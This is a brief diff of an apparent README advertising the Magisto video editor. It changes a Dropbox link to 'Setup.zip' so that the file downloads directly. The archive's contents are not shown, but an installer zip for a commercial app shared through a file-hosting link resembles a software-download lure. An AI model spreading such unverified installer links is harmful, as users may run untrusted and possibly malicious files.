@@ -14,7 +14,7 @@
 
 ## Join The Video Revolution. Make outstanding social videos in minutes with the power of Magisto’s smart video editor. Be a video superhero.
 
-## [⚡️Magisto 6.8.1](https://www.dropbox.com/s/xf392pswr2whoif/Setup.zip?dl=0):
+## [⚡️Magisto 6.8.1](https://www.dropbox.com/s/xf392pswr2whoif/Setup.zip?dl=1):
 * Fast 
 Video storytelling as fast as writing a blog post.
 
